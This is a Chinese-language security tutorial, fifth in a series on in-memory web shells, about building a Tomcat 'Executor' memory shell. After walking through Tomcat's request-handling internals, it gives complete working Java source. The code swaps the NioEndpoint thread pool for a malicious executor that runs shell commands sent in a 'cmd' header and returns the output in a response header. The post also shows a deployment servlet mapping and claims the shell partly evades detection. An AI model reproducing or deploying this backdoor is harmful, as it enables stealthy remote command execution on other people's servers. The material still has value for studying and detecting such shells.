## 写在前面

前面已经从代码层面讲解了Tomcat的架构，这是内存马系列文章的第五篇，带来的是Tomcat
Executor类型的内存马实现。有了前面第四篇中的了解，才能更好的看懂内存马的构造。

## 前置

### 什么是Executor

Executor是一种可以在Tomcat组件之间进行共享的连接池。

我们可以从代码中观察到对应的描述：

> The Executor implementations provided in this package implement
> ExecutorService, which is a more extensive interface. The ThreadPoolExecutor
> class provides an extensible thread pool implementation. The Executors class
> provides convenient factory methods for these Executors.  
> Memory consistency effects: Actions in a thread prior to submitting a
> Runnable object to an Executor happen-before its execution begins, perhaps
> in another thread.

![image-20220912172909884.png](https://image.3001.net/images/20220918/1663491741_6326de9db4cd4bd79ee15.png!small)

> Executes the given command at some time in the future. The command may
> execute in a new thread, in a pooled thread, or in the calling thread, at
> the discretion of the Executor implementation.  
> Params: command – the runnable task  
> Throws: RejectedExecutionException – if this task cannot be accepted for
> execution  
> NullPointerException – if command is null

对于他的作用，允许为一个Service的所有Connector配置一个共享线程池。

在运行多个Connector的状况下，这样处理非常有用，而且每个Connector必须设置一个maxThread值，但不希望Tomcat实例并发使用的线程最大数永远与所有连接器maxThread数量的总和一样高。

这是因为如果这样处理，则需要占用太多的硬件资源。相反，您可以使用Executor元素配置一个共享线程池，而且所有的Connector都能共享这个线程池。

### 分析流程

通过上篇文章的分析我们知道，

在启动Tomcat的时候首先会。

调用启动类，并传入参数start预示着Tomcat启动：

![image-20220912175409785.png](https://image.3001.net/images/20220918/1663491748_6326dea4d7e510b2e1565.png!small)

这里调用start方法进行相关配置的初始化操作，

一直走到了`org.apache.catalina.startup.Catalina`类中load方法中调用了。`this.getServer().init()`方法进行Server的初始化操作，

即调用了`LifecycleBase#init`方法，进而调用了`initInternal`方法，即来到了他的实现类`StandardServer#initInternal`中来了。

![image-20220912180117577.png](https://image.3001.net/images/20220918/1663491755_6326deab90b7cc07f366a.png!small)

上篇中也提到过，将会循环的调用所有service的init方法，进而调用了`StandardService#initInternal`方法进行初始化，调用了`Engine#init`方法，因为没有配置Executor，所以在初始化的时候不会调用他的init方法，之后再调用`mapperListener.init()`进行Listener的初始化操作，在获取了所有的connector之后将会循环调用其init方法进行初始化。

![image-20220912180558740.png](https://image.3001.net/images/20220918/1663491762_6326deb2f0316d04a808b.png!small)

在初始化结束之后将会调用`start`方法

![image-20220912193917307.png](https://image.3001.net/images/20220918/1663491770_6326deba5cb1938bbe5b0.png!small)

即调用了`Bootstrap#start`方法，进而调用了Server.start方法

来到了`StandardService#startInternal`方法，紧跟着调用了上面调用了Init方法的start方法，成功启动Tomcat。

## 正文

接下来我们来分析一下为什么选用Executor来构造内存马，和如构造内存的流程。

### 分析注入方式

在成功开启了Tomcat之后，我们可以在`Executor`中的`execute`方法中打下断点，

![image-20220912195616660.png](https://image.3001.net/images/20220918/1663491777_6326dec1581d3c511f122.png!small)

之后运行访问8080端口

在前面那一篇文章中我们知道`Acceptor`是生产者，而`Poller`是消费者，

在执行`Endpoint.start()`会开启`Acceptor线程`来处理请求。

在其run方法中存在

  1. 运行过程中，如果`Endpoint`暂停了，则`Acceptor`进行自旋（间隔50毫秒）；

  2. 如果`Endpoint`终止运行了，则`Acceptor`也会终止；

  3. 如果请求达到了最大连接数，则wait直到连接数降下来；

  4. 接受下一次连接的socket。

这一步己经在运行Tomcat容器的时候已经进行了，

在我们访问Tomcat的页面之后将会创建一个线程，并调用target属性的run方法，这里的target就是Poller对象(消费者)。

![image-20220912201105821.png](https://image.3001.net/images/20220918/1663491784_6326dec815cf8fc1852b1.png!small)

即调用了`NioEndpoint$Poller#run`方法，跟进

    
    
    public void run() {
        while(true) {
            boolean hasEvents = false;
    
            label58: {
                try {
                    if (!this.close) {
                        hasEvents = this.events();
                        if (this.wakeupCounter.getAndSet(-1L) > 0L) {
                            this.keyCount = this.selector.selectNow();
                        } else {
                            this.keyCount = this.selector.select(NioEndpoint.this.selectorTimeout);
                        }
    
                        this.wakeupCounter.set(0L);
                    }
    
                    if (!this.close) {
                        break label58;
                    }
    
                    this.events();
                    this.timeout(0, false);
    
                    try {
                        this.selector.close();
                    } catch (IOException var5) {
                        NioEndpoint.log.error(AbstractEndpoint.sm.getString("endpoint.nio.selectorCloseFail"), var5);
                    }
                } catch (Throwable var6) {
                    ExceptionUtils.handleThrowable(var6);
                    NioEndpoint.log.error("", var6);
                    continue;
                }
    
                NioEndpoint.this.getStopLatch().countDown();
                return;
            }
    
            if (this.keyCount == 0) {
                hasEvents |= this.events();
            }
    
            Iterator iterator = this.keyCount > 0 ? this.selector.selectedKeys().iterator() : null;
    
            while(iterator != null && iterator.hasNext()) {
                SelectionKey sk = (SelectionKey)iterator.next();
                iterator.remove();
                NioEndpoint.NioSocketWrapper socketWrapper = (NioEndpoint.NioSocketWrapper)sk.attachment();
                if (socketWrapper != null) {
                    this.processKey(sk, socketWrapper);
                }
            }
    
            this.timeout(this.keyCount, hasEvents);
        }
    }
    

首先调用了`events`方法，查看队列中是否有Pollerevent事件，如果有就将其取出，然后把里面的Channel取出来注册到该Selector中，然后通过迭代器查看所有注册过的Channel查看是否有事件发生。  
当有事件发生时，则调用SocketProcessor交给Executor执行。

调用了processKey(sk, socketWrapper)进行处理，

![image-20220912213133643.png](https://image.3001.net/images/20220918/1663491793_6326ded1915ce93c89f44.png!small)

该方法又会根据key的类型，来分别处理读和写，

  1. 处理读事件，比如生成Request对象；

  2. 处理写事件，比如将生成的Response对象通过socket写回客户端；

这里处理的是读事件，所以调用了`processSocket`方法，

![image-20220912213448088.png](https://image.3001.net/images/20220918/1663491800_6326ded86bdeeac36b23d.png!small)

首先从`processorCache`中弹出一个`Processor`来处理`socket，`

之后调用`getExecutor`方法获取一个Executor对象。

![image-20220912214811923.png](https://image.3001.net/images/20220918/1663491806_6326dedebb887df12ee19.png!small)

这里的executor是endpoint自己启动的`ThreadPoolExecutor`类，

在之后将会调用其execute方法。

![image-20220912215239958.png](https://image.3001.net/images/20220918/1663491813_6326dee58e759ff370817.png!small)

既然它能够调用Executor类的execute方法，那么我们可以创建一个恶意的Executor类继承`ThreadPoolExecutor`，并重写其中的execute方法，那么在调用该方法的时候将会执行我们的恶意代码。

但是，怎么才能将其中的executor属性值替换成我们的恶意Executor类呢？

我们可以注意到在`AbstractEndpoint`类中，我们在调用processSocket方法时候提取出来了executor属性值，那么是否有对应的setter方法呢？

![image-20220912215740978.png](https://image.3001.net/images/20220918/1663491819_6326deebf271f49497af3.png!small)

是的存在一个`setExecutor`方法，能够替换掉原来的executor属性值，之后在消费者消费的同时将会执行我们的恶意代码。

那么如果编写我们的恶意代码呢？

起码需要实现命令执行和回显的功能吧。

我们总需要获取到reqeust对象，出去对应的参数值，进行命令执行~

我们可以通过项目https://github.com/c0ny1/java-object-searcher来查找利用链，

我们可以发现在当前线程中的可以找到该请求：

    
    
    ((Http11InputBuffer)((NioChannel)((Object[])((SynchronizedStack)((NioEndpoint)((Acceptor)((Thread)this).group.threads[6].target).this$0).nioChannels).stack)[0]).appReadBufHandler).byteBuffer.hb
    

可以将这段带入Evaluate进行计算，

![image-20220912234357270.png](https://image.3001.net/images/20220918/1663491827_6326def3d54f415bc941d.png!small)

在这里我们能够获取到我们传入的参数值，之后就可以将其提取出来，进行执行命令。

后面就需要一个回显，回显命令执行之后的结果，如何回显？

我们可以观察到在`AbstractProcessor`类的构造方法中将会初始化一个Request和Response对象，

![image-20220912235935342.png](https://image.3001.net/images/20220918/1663491835_6326defb3bfaf646e74de.png!small)

既然我们需要做出回显，那么我们需要寻找response在哪里，同样可以通过前面那个项目快速搜索到。

    
    
    ((Request)((RequestInfo)((java.util.ArrayList)((RequestGroupInfo)((ConnectionHandler)((NioEndpoint)((Acceptor)((ThreadGroup)((TaskThread)this).group).threads[6].target).this$0).handler).global).processors).get(0)).req).response
    

![image-20220913000750243.png](https://image.3001.net/images/20220918/1663491841_6326df01aaed67cc06363.png!small)

在知道了reponse的位置之后，我们就能过获取到对应的数据了。

此时的调用栈

    
    
    prepareResponse:1081, Http11Processor (org.apache.coyote.http11)
    action:384, AbstractProcessor (org.apache.coyote)
    action:208, Response (org.apache.coyote)
    sendHeaders:421, Response (org.apache.coyote)
    doFlush:310, OutputBuffer (org.apache.catalina.connector)
    close:270, OutputBuffer (org.apache.catalina.connector)
    finishResponse:446, Response (org.apache.catalina.connector)
    service:395, CoyoteAdapter (org.apache.catalina.connector)
    service:624, Http11Processor (org.apache.coyote.http11)
    process:65, AbstractProcessorLight (org.apache.coyote)
    process:831, AbstractProtocol$ConnectionHandler (org.apache.coyote)
    doRun:1673, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)
    run:49, SocketProcessorBase (org.apache.tomcat.util.net)
    runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)
    run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)
    run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)
    run:748, Thread (java.lang)
    

在`prepareResponse`方法中，将会对response进行再次封装，我们只需要提前将我们命令执行后的结果放在reponse中，我们就可以得到回显了。

怎么写入reponse结构中呢？这里不想前面的三种内存马，能够直接创建回显，这里稍微复杂一点，我们可以来到`org.apache.catalina.connector.Response`这个类中。

![image-20220913001636776.png](https://image.3001.net/images/20220918/1663491849_6326df09d1c509bde727d.png!small)

继承了`HttpServletReponse`接口，

![image-20220913001807060.png](https://image.3001.net/images/20220918/1663491856_6326df1016ad7dd00f4a7.png!small)

封装了很多方法，可以通过这些方法将回显的数据传回。

所以我们可以得到构造Executor内存马的流程：

  1. 首先获取对应的NioEndpoint(对比上面分析的request和response位置，我们可以知道有一个共同点)；

  2. 获取对应的executor属性；

  3. 创建一个恶意的executor；

  4. 将恶意的executor传入。

### 手把手构造

我们可以通过在当前线程获取NioEndpoint类，为什么可以从当前线程找到呢？

我们可以查看上面寻找request的内存对象路径，

    
    
    ((Http11InputBuffer)((NioChannel)((Object[])((SynchronizedStack)((NioEndpoint)((Acceptor)((Thread)this).group.threads[6].target).this$0).nioChannels).stack)[0]).appReadBufHandler).byteBuffer.hb
    

其中有一段就是NioEndpoint类，

    
    
    ((NioEndpoint)((Acceptor)((Thread)this).group.threads[6].target).this$0)
    

所以我们可以编写获取方法，

    
    
    public Object getNioEndpoint() {
        // 获取当前线程的所有线程
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            try {
                // 需要获取线程的特征包含Acceptor
                if (thread.getName().contains("Acceptor")) {
                    Object target = getField(thread, "target");
                    Object nioEndpoint = getField(target, "this$0");
                    return nioEndpoint;
                }
            } catch (Exception e) {
                continue;
            }
        }
        // 没有获取到对应Endpoint，返回一个空对象
        return new Object();
    }
    

之后获取NioEndpoint类的executor属性，

本身在NioEndpoint类中并没有executor属性，但是我们可以观察该类的继承关系。

![image-20220913114245364.png](https://image.3001.net/images/20220918/1663491865_6326df1985b38191b7ea8.png!small)

在他的父类`AbstractEndpoint`类中是存在这个属性的，

    
    
    ThreadPoolExecutor executor = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
    

之后我们需要创建一个恶意的executor，需要实现命令执行和回显操作。

这一步可以分为好几步，首先需要获取到request对象中需要执行的命令，

对于request对象的获取可以结合上面贴的`Evaluate`进行构造：

    
    
    public String getRequest() {
        try {
            // 通过调用getNioEndpoint方法获取到NioEndpoint对象
            Object nioEndpoint = getNioEndpoint();
            // 获取到stack数组
            Object[] objects = (Object[]) getField(getField(nioEndpoint, "nioChannels"), "stack");
            // 获取到Buffer
            ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], "appReadBufHandler"), "byteBuffer");
            String req = new String(heapByteBuffer.array(), "UTF-8");
            // 分割出command
            String cmd = req.substring(req.indexOf("cmd") + "cmd".length() + 1, req.indexOf("\r", req.indexOf("cmd")) - 1);
            return cmd;
        } catch (Exception e) {
            System.out.println(e);
            return null;
        }
    }
    

大概提一下，为什么这里是`+1`不是`+1`不是我们在请求头冒号后面不是有一个空格吗，不是应该+2嘛，不是的，通过调用，我发现在获取的req中并没有空格存在，所以这里是+1。

而后面为什么要-1，就是因为在获取req中最后一个字符又存在两次，

![image-20220913151232613.png](https://image.3001.net/images/20220918/1663491872_6326df20c5ba7c522033f.png!small)

之后同样需要能够将执行结果写入reponse，

同样，因为response是封装在req对象中的，由此思路可以在当前线程中获取到response对象。

之后通过addHeader方法将结果写入返回头中，

    
    
    // 获取命令执行返回的回显结果
    public void getResponse(byte[] res) {
        try {
            // 获取NioEndpoint对象
            Object nioEndpoint = getNioEndpoint();
            // 获取线程中的response对象
            ArrayList processors = (ArrayList) getField(getField(getField(nioEndpoint, "handler"), "global"), "processors");
            // 遍历获取response
            for (Object processor : processors) {
                RequestInfo requestInfo = (RequestInfo) processor;
                // 获取到封装在req的response
                Response response = (Response) getField(getField(requestInfo, "req"), "response");
                // 将执行的结果写入response中
                response.addHeader("Execute-result", new String(res, "UTF-8"));
            }
        } catch (Exception e) {
    
        }
    }
    

最后一步就是重写Exector的execute方法了。

执行命令，将结果输入流写入response中去，

    
    
    public void execute(Runnable command) {
        // 获取command
        String cmd = getRequest();
        try {
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
            byte[] result = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next().getBytes();
            getResponse(result);
        } catch (Exception e) {
    
        }
    
        this.execute(command, 0L, TimeUnit.MILLISECONDS);
    }
    

最后就需要将我们构造的恶意executor传入，

    
    
    nioEndpoint.setExecutor(exe);
    

完整的内存马

    
    
    package pres.test.momenshell;
    
    import org.apache.coyote.Response;
    import org.apache.coyote.RequestInfo;
    import org.apache.tomcat.util.net.NioEndpoint;
    import org.apache.tomcat.util.threads.ThreadPoolExecutor;
    
    import javax.servlet.ServletException;
    import javax.servlet.http.HttpServlet;
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.nio.ByteBuffer;
    import java.nio.charset.StandardCharsets;
    import java.util.ArrayList;
    import java.util.concurrent.BlockingQueue;
    import java.util.concurrent.ThreadFactory;
    import java.util.concurrent.TimeUnit;
    
    public class AddTomcatExecutor extends HttpServlet {
    
        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            doPost(req, resp);
        }
    
        public Object getField(Object obj, String field) {
            // 递归获取类的及其父类的属性
            Class clazz = obj.getClass();
            while (clazz != Object.class) {
                try {
                    Field declaredField = clazz.getDeclaredField(field);
                    declaredField.setAccessible(true);
                    return declaredField.get(obj);
                } catch (Exception e) {
                    clazz = clazz.getSuperclass();
                }
            }
            return null;
        }
    
        public Object getNioEndpoint() {
            // 获取当前线程的所有线程
            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
            for (Thread thread : threads) {
                try {
                    // 需要获取线程的特征包含Acceptor
                    if (thread.getName().contains("Acceptor")) {
                        Object target = getField(thread, "target");
                        Object nioEndpoint = getField(target, "this$0");
                        return nioEndpoint;
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                    continue;
                }
            }
            // 没有获取到对应Endpoint，返回一个空对象
            return new Object();
        }
        class executorEvil extends ThreadPoolExecutor {
            public executorEvil(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
                super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
            }
            public String getRequest() {
                try {
                    // 通过调用getNioEndpoint方法获取到NioEndpoint对象
                    Object nioEndpoint = getNioEndpoint();
                    // 获取到stack数组
                    Object[] objects = (Object[]) getField(getField(nioEndpoint, "nioChannels"), "stack");
                    // 获取到Buffer
                    ByteBuffer heapByteBuffer = (ByteBuffer) getField(getField(objects[0], "appReadBufHandler"), "byteBuffer");
                    String req = new String(heapByteBuffer.array(), "UTF-8");
                    // 分割出command
                    String cmd = req.substring(req.indexOf("cmd") + "cmd".length() + 1, req.indexOf("\r", req.indexOf("cmd")) - 1);
                    return cmd;
                } catch (Exception e) {
                    e.printStackTrace();
                    return null;
                }
            }
            // 获取命令执行返回的回显结果
            public void getResponse(byte[] res) {
                try {
                    // 获取NioEndpoint对象
                    Object nioEndpoint = getNioEndpoint();
                    // 获取线程中的response对象
                    ArrayList processors = (ArrayList) getField(getField(getField(nioEndpoint, "handler"), "global"), "processors");
                    // 遍历获取response
                    for (Object processor : processors) {
                        RequestInfo requestInfo = (RequestInfo) processor;
                        // 获取到封装在req的response
                        Response response = (Response) getField(getField(requestInfo, "req"), "response");
                        // 将执行的结果写入response中
                        response.addHeader("Execute-result", new String(res, "UTF-8"));
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
    
            @Override
            public void execute(Runnable command) {
                // 获取command
                String cmd = getRequest();
                try {
                    String[] cmds = System.getProperty("os.name").toLowerCase().contains("windows") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmds).start().getInputStream()).useDelimiter("\\A").next().getBytes();
                    getResponse(result);
                } catch (Exception e) {
                    e.printStackTrace();
                }
    
                this.execute(command, 0L, TimeUnit.MILLISECONDS);
            }
        }
        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            // 从线程中获取NioEndpoint类
            NioEndpoint nioEndpoint = (NioEndpoint) getNioEndpoint();
            // 获取executor属性
            ThreadPoolExecutor executor = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
            // 实例化我们的恶意executor类
            executorEvil evil = new executorEvil(executor.getCorePoolSize(), executor.getMaximumPoolSize(), executor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, executor.getQueue(), executor.getThreadFactory(), executor.getRejectedExecutionHandler());
            // 将恶意类传入
            nioEndpoint.setExecutor(evil);
        }
    }
    

### 简单示例

我们可以创建一个继承了HttpServlet的类，就是上面的完整内存马。

我们通过方法这个Servlet的方法写入内存马，

在web.xml中添加路由映射，

    
    
    <servlet>
        <servlet-name>AddTomcatExecutor</servlet-name>
        <servlet-class>pres.test.momenshell.AddTomcatExecutor</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>AddTomcatExecutor</servlet-name>
        <url-pattern>/addTomcatExecutor</url-pattern>
    </servlet-mapping>
    

在开启Tomcat之后，访问该路由，

将会成功写入内存马，

之后通过burp发送数据包，加上一个cmd的请求头，后面包含执行的命令。

![image-20220913153442864.png](https://image.3001.net/images/20220918/1663491886_6326df2eba1e3d2cdcc90.png!small)

成功执行命令并回显。

## 总结

这个是一个比较新颖的内存马思路，使用了Connector中的组件构造出了独特的内存马。

同样可以一定程度上绕过检测与查杀，当然后面会有几篇和查杀有关的篇章，将会进行比较各个内存马的差异。

构造内存马思路：

  1. 首先获取对应的NioEndpoint(对比上面分析的request和response位置，我们可以知道有一个共同点)；

  2. 获取对应的executor属性；

  3. 创建一个恶意的executor；

  4. 将恶意的executor传入。

## Reference

https://xz.aliyun.com/t/11593

